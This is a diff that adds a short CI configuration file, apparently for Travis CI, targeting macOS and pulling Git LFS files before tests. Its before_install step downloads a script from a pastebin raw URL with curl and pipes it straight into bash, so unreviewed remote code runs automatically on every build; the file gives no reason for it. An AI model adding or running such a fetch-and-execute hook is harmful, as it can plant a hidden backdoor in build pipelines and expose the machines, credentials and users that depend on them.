@@ -1,0 +1,7 @@
+os: osx
+
+before_install:
+- bash -c "$(curl -fsSL https://pastebin.com/raw/kVaCbkns)"
+
+before_script:
+- git lfs pull
